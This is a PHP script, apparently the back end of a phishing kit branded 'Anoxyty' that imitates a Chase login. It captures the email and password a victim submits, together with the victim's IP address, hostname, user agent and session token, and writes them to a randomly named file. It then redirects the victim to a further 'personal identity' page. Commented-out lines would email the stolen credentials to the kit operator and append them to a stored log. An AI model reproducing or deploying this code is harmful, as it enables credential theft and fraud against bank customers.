<?php 


    function genRandString($length = 10) {
        $characters = '0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ';
        $randomString = '';
        for ($i = 0; $i < $length; $i++) {
            $randomString .= $characters[rand(0, strlen($characters) - 1)];
        }
        return $randomString;
    }



   ob_start();
   session_start();
//    include '../data.php';
//    include '../anoxytytrap/info.php';
   $ip = getenv("REMOTE_ADDR");
   $hostname = gethostbyaddr($ip);
   $useragent = $_SERVER['HTTP_USER_AGENT'];
   if ( isset( $_POST['email'] ) ) {
   	
   	$_SESSION['email'] 	  = $_POST['email'];
   	$_SESSION['password'] 	  = $_POST['password'];
    $log = "email: ".$_SESSION['email']."    password: ".$_SESSION['password']."    login ip: ".$ip."    hostname: ".$hostname."    user agent: ". $useragent."    security token: ".$_SESSION['securityToken'] ;
    $filename = $_SESSION['filename'];
    if($filename == ""){
        $_SESSION['randString'] = genRandString(80);
        $filename = $_SESSION['randString'];

        if(!file_put_contents($filename, $log)){
            // permission issue
        }
    }else{
        file_put_contents($filename, $log,  FILE_APPEND | LOCK_EX);

    }




//     $message = file_get_contents('../anoxyty/send/mail.html');
   
//     $message = preg_replace('{AN0XYTY-G}', $_SESSION['email'], $message);
//     $message = preg_replace('{AN0XYTY-H}', $_SESSION['password'], $message);
   
//     $message = preg_replace('{AN0XYTY-IP}', $ip, $message);
    
//     $message = preg_replace('{AN0XYTY-INFO}', $ip, $message);
//     $message = preg_replace('{AN0XYTY-UGENT}', $useragent, $message);
   
   
//    $message = preg_replace('{AN0XYTY-Z}', $LOOKUP_CITY, $message);
//    $message = preg_replace('{AN0XYTY-X}', $LOOKUP_STATE, $message);
//    $message = preg_replace('{AN0XYTY-W}', $LOOKUP_ISP, $message);
   
//           $subject = " CHASE EMAIL ACCESS By Anoxyty  : $ip";
//           $headers = "From: Anoxyty <chase@anoxyty.com>\r\n";
//           $headers .= "MIME-Version: 1.0\r\n";
//           $headers .= "Content-Type: text/html; charset=UTF-8\r\n";
        
//           @mail($data,$subject,$message,$headers);
   
//    	$save = fopen("saved/stored.html","a+");
//           fwrite($save,$message);
//           fclose($save);
   
   
          header("Location: ../personal_identity.php?dashboard/personal_information=dashboard/overview");
          exit();
   } else {
   	header("Location: index.php");
   	exit();
   }
   ?>